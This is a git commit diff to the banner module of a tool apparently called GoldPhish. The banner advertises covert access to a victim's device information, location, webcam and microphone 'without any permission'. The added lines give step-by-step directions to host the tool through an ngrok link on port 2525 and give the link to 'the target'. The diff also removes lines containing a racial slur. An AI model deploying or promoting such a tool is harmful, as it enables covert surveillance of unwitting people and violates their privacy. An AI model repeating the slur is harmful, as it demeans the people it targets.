4653e04a711df8683de4a7828eae009c9a63531a
A-Brew <105552129+NoobDev48@users.noreply.github.com>
2022-12-24 00:47:19 +0800

    Update banner.py

--- modules/banner.py
+++ modules/banner.py
@@ -9,14 +9,19 @@ def banner():
     else:
       os.system("clear")
     print(Fore.LIGHTWHITE_EX+"WELCOME TO GOLDPHISH!")   
-    print(Fore.LIGHTWHITE_EX+"**FEATURES**")  
+    print(Fore.LIGHTWHITE_EX+"***************FEATURES****************")  
     print(Fore.LIGHTWHITE_EX+"• Obtain Device Information Without Any Permission !")
     print(Fore.LIGHTWHITE_EX+"• Access Location [SMARTPHONES ONLY]")
     print(Fore.LIGHTWHITE_EX+"• Access Webcam and directly send the image to you!")
     print(Fore.LIGHTWHITE_EX+"• Access Microphone")
-    print(Fore.LIGHTWHITE_EX+"*********MADE BY A REAL NIGGA!!*********")
-    print(Fore.LIGHTWHITE_EX+"*********MADE BY A REAL NIGGA!!*********")
-
+    print(Fore.LIGHTWHITE_EX+"*********MADE BY A REAL RONALD D. GREAT*********")
+    print(Fore.LIGHTWHITE_EX+"")
+    print(Fore.LIGHTWHITE_EX+"Steps on how to run GoldPhish on any terminals")
+    print(Fore.LIGHTWHITE_EX+"First thing to do is Read the ReadMe on GoldPhish github")
+    print(Fore.LIGHTWHITE_EX+"2. type python3 goldphish.py to run the script")
+    print(Fore.LIGHTWHITE_EX+"3. Make another session and host a NGROK link using 2525 port")
+    print(Fore.LIGHTWHITE_EX+"4. Copy the link and give it to the target")
+    
     print(Style.RESET_ALL)
 
 banner()
